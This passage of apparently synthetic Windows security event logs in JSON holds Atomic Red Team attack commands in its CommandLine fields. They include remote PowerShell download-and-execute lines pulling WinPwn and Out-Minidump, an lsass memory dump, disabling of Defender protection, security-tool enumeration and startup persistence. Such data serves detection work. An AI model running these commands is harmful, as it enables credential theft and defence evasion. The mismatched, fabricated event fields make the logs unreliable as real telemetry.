        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\npowershellsensitive -consoleoutput -noninteractive\",",
        "LogonID": 148755,
        "LogonGuid": "9bf34275-4289-4e22-8479-f2b3b49d13da",
        "SourceProcessID": 8026,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\call..dll",
        "DestinationProcessID": 8009,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\politics..dll",
        "UtcTime": "2024-05-17T01:36:51.834038Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-72.sanchez-mccarthy.org",
        "User": "james56",
        "ProcessID": 7420,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo touch #{file_to_setuid}\\nsudo chown root #{file_to_setuid}\\nsudo chmod g+xs #{file_to_setuid}\\n\",",
        "LogonID": 980216,
        "LogonGuid": "bfb2a49c-75ee-4507-881c-1ba7ff6487de",
        "SourceProcessID": 9264,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\American..exe",
        "DestinationProcessID": 5039,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\better..exe",
        "UtcTime": "2024-05-17T01:36:51.834038Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-63.clarke.com",
        "User": "leonardmathews",
        "ProcessID": 8006,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cmd /c '#{netscan_path}' /hide /auto:\\\"$env:temp\\\\T1018NetscanOutput.txt\\\" /range:'#{range_to_scan}'\",",
        "LogonID": 673184,
        "LogonGuid": "453b1945-4b2a-4e16-8c5a-9a600cf2df15",
        "SourceProcessID": 9467,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\yeah..dll",
        "DestinationProcessID": 8786,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\explain..exe",
        "UtcTime": "2024-05-17T01:36:51.834038Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-57.smith-hanson.net",
        "User": "kingrenee",
        "ProcessID": 1723,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"pnputil.exe /add-driver \\\"#{driver_inf}\\\"\\n\",",
        "LogonID": 647558,
        "LogonGuid": "d38caa03-7223-490b-b63c-d7013a285163",
        "SourceProcessID": 6823,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\sing..exe",
        "DestinationProcessID": 9650,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\base..dll",
        "UtcTime": "2024-05-17T01:36:51.835039Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-53.ho.net",
        "User": "elizabeth18",
        "ProcessID": 6730,
        "ProcessName": "malware.exe",
        "CommandLine": "\"aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}\\n\",",
        "LogonID": 616949,
        "LogonGuid": "e1905a01-20fd-4f79-9fbe-52afca10b8bf",
        "SourceProcessID": 4358,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\treatment..dll",
        "DestinationProcessID": 9829,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\up..exe",
        "UtcTime": "2024-05-17T01:36:51.835039Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-16.barton.com",
        "User": "grossjeff",
        "ProcessID": 4061,
        "ProcessName": "nc.exe",
        "CommandLine": "\"bash -c 'trap \\\"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\\\" SIGINT && kill -SIGINT $$'\\n\",",
        "LogonID": 683060,
        "LogonGuid": "f1c064f7-abf5-4f70-af90-01b93ba0f0dc",
        "SourceProcessID": 3603,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\both..dll",
        "DestinationProcessID": 2363,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\fly..exe",
        "UtcTime": "2024-05-17T01:36:51.835039Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-29.snyder.com",
        "User": "ple",
        "ProcessID": 6881,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \\ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\\ndocker exec -i t1609_container bash -c \\\"cat /tmp/output.txt\\\"\\n\",",
        "LogonID": 133714,
        "LogonGuid": "9adde849-91d2-47cd-8619-f69e0be6198f",
        "SourceProcessID": 2314,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\beat..exe",
        "DestinationProcessID": 8356,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\table..exe",
        "UtcTime": "2024-05-17T01:36:51.835039Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-00.padilla.net",
        "User": "caroline03",
        "ProcessID": 3192,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"\\\"#{exe_binary}\\\"\\n\",",
        "LogonID": 179742,
        "LogonGuid": "a5b88235-7862-434c-9873-b9a98e133a72",
        "SourceProcessID": 3446,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\wife..exe",
        "DestinationProcessID": 8971,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\so..dll",
        "UtcTime": "2024-05-17T01:36:51.835039Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-77.meadows.com",
        "User": "washingtondanielle",
        "ProcessID": 1673,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nNew-Item -Type Directory \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\\\\" -ErrorAction Ignore -Force | Out-Null\\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\\nget-process lsass | Out-Minidump\\n\",",
        "LogonID": 216559,
        "LogonGuid": "4fbc3b85-2eb9-4740-a49a-2ba973f12240",
        "SourceProcessID": 3835,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\young..exe",
        "DestinationProcessID": 8933,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\director..exe",
        "UtcTime": "2024-05-17T01:36:51.836035Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-05.hubbard.com",
        "User": "cjackson",
        "ProcessID": 4185,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sudo mdatp config real-time-protection --value disabled\\n\",",
        "LogonID": 801259,
        "LogonGuid": "a7362633-1480-4db4-8454-7fc14134f3d8",
        "SourceProcessID": 8016,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\condition..dll",
        "DestinationProcessID": 7700,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\certainly..exe",
        "UtcTime": "2024-05-17T01:36:51.836035Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-72.shepherd.info",
        "User": "nmorris",
        "ProcessID": 9101,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \\n\",",
        "LogonID": 665092,
        "LogonGuid": "b7708769-082e-4590-8b87-810516e910d8",
        "SourceProcessID": 2238,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\usually..exe",
        "DestinationProcessID": 2568,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\parent..exe",
        "UtcTime": "2024-05-17T01:36:51.836035Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-19.lewis.org",
        "User": "avillanueva",
        "ProcessID": 5116,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"ps aux | egrep 'Little\\\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\\n\",",
        "LogonID": 688923,
        "LogonGuid": "a2eaaf76-b991-47d3-bc92-f2f922d2921b",
        "SourceProcessID": 6469,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\opportunity..dll",
        "DestinationProcessID": 2683,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\return..exe",
        "UtcTime": "2024-05-17T01:36:51.836035Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-71.cordova.org",
        "User": "terri29",
        "ProcessID": 7395,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"docker build -t t1610 $PathtoAtomicsFolder/T1610/src/\\ndocker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh\\n\",",
        "LogonID": 616736,
        "LogonGuid": "f3a52fc8-98c1-4432-80ed-48a800620187",
        "SourceProcessID": 6235,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\green..exe",
        "DestinationProcessID": 5617,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\myself..exe",
        "UtcTime": "2024-05-17T01:36:51.836035Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-84.castillo.biz",
        "User": "jessicaolson",
        "ProcessID": 7620,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}\",",
        "LogonID": 356859,
        "LogonGuid": "ef618855-79d7-42a3-8ef1-a95c5cf2af3c",
        "SourceProcessID": 8970,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\time..dll",
        "DestinationProcessID": 4210,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\operation..dll",
        "UtcTime": "2024-05-17T01:36:51.836035Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-84.smith.org",
        "User": "crichardson",
        "ProcessID": 2656,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\batstartup.bat\\\" \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\\"\\nCopy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\batstartup.bat\\\" \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\\"\\nStart-Process \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\batstartup.bat\\\"\\nStart-Process \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\batstartup.bat\\\"\\n\",",
        "LogonID": 832389,
        "LogonGuid": "3d3d40d1-331c-486e-beaf-f9d58b079e52",
        "SourceProcessID": 4479,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\second..dll",
        "DestinationProcessID": 3954,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\threat..dll",
        "UtcTime": "2024-05-17T01:36:51.836035Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-50.wise.com",
        "User": "daniel99",
        "ProcessID": 7421,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"bash -c 'trap \\\"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\\\" EXIT'\\n\",",
        "LogonID": 890070,
        "LogonGuid": "328cd882-95d6-444b-b77d-d34d80b831c5",
        "SourceProcessID": 9213,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\level..exe",
        "DestinationProcessID": 8950,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\actually..exe",
        "UtcTime": "2024-05-17T01:36:51.837036Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-04.mitchell-smith.com",
        "User": "phillipsgabriel",
        "ProcessID": 4576,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \\\"#{inf_to_execute}\\\"\\n\",",
        "LogonID": 365686,
        "LogonGuid": "0aa2c83d-4e86-4073-bb19-b64da6ef6fc4",
        "SourceProcessID": 9314,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\knowledge..exe",
        "DestinationProcessID": 9060,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\nothing..exe",
        "UtcTime": "2024-05-17T01:36:51.837036Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-65.murphy-hunter.com",
        "User": "inavarro",
        "ProcessID": 1916,
        "ProcessName": "malware.exe",
        "CommandLine": "\"which_python=`which python || which python3`\\n$which_python -c \\\"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\\\"\\n\",",
        "LogonID": 143234,
        "LogonGuid": "e919532c-c2a4-4423-a356-b09e367b0560",
        "SourceProcessID": 7274,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\represent..exe",
        "DestinationProcessID": 4274,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\keep..exe",
        "UtcTime": "2024-05-17T01:36:51.837036Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-48.delgado.biz",
        "User": "cainzachary",
        "ProcessID": 9344,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/\\ndocker run --name t1069_container  -d -t t1069\\ndocker exec t1069_container ./test.sh\",",
        "LogonID": 832125,
        "LogonGuid": "5d9fd242-6a3c-46a1-b63e-27884ad0e8d5",
        "SourceProcessID": 4384,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\nothing..exe",
        "DestinationProcessID": 7538,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\laugh..dll",
        "UtcTime": "2024-05-17T01:36:51.837036Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-78.cabrera.com",
        "User": "yhernandez",
        "ProcessID": 9667,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"dsenableroot #current user\\ndsenableroot -u art-tester -p art-tester -r art-root #new user\",",
        "LogonID": 774566,
        "LogonGuid": "ab568c68-1ff3-4759-a8c8-8b8ba6ab94f1",
        "SourceProcessID": 9158,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\lead..exe",
        "DestinationProcessID": 5094,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\high..dll",
        "UtcTime": "2024-05-17T01:36:51.837036Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-13.webb-young.com",
        "User": "michelle87",
        "ProcessID": 8932,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path \\\"#{dll_payload}\\\"\\n\",",
        "LogonID": 236900,
        "LogonGuid": "900db472-5f1d-4c11-bbfa-4fb113e4d8a3",
        "SourceProcessID": 1618,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\real..dll",
        "DestinationProcessID": 1105,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\today..exe",
        "UtcTime": "2024-05-17T01:36:51.838034Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-41.garcia.com",
        "User": "sawyerjohn",
        "ProcessID": 6672,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nDotnetsearch -noninteractive -consoleoutput\",",
        "LogonID": 133544,
        "LogonGuid": "6f8aef99-4e9a-4eec-a728-a38f1dd45728",
        "SourceProcessID": 1437,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\identify..dll",
        "DestinationProcessID": 1073,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\improve..exe",
        "UtcTime": "2024-05-17T01:36:51.838034Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-92.perez-richard.com",
        "User": "alyssawilliams",
        "ProcessID": 6113,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"copy-item -Path \\\"\\\\\\\\#{remote}\\\\C$\\\\#{share_file}\\\" -Destination \\\"$Env:TEMP\\\\#{local_file}\\\"\",",
        "LogonID": 347135,
        "LogonGuid": "0ac50a36-c0a3-41f8-a1c0-f17310429cdf",
        "SourceProcessID": 6355,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\here..exe",
        "DestinationProcessID": 3912,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\stage..exe",
        "UtcTime": "2024-05-17T01:36:51.838034Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-58.white-chang.com",
        "User": "berryrichard",
        "ProcessID": 7139,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 825293,
        "LogonGuid": "3c9dae97-c058-4efd-85a8-c90b07665824",
        "SourceProcessID": 2766,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\expert..exe",
        "DestinationProcessID": 2950,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\day..exe",
        "UtcTime": "2024-05-17T01:36:51.838034Z"
    },
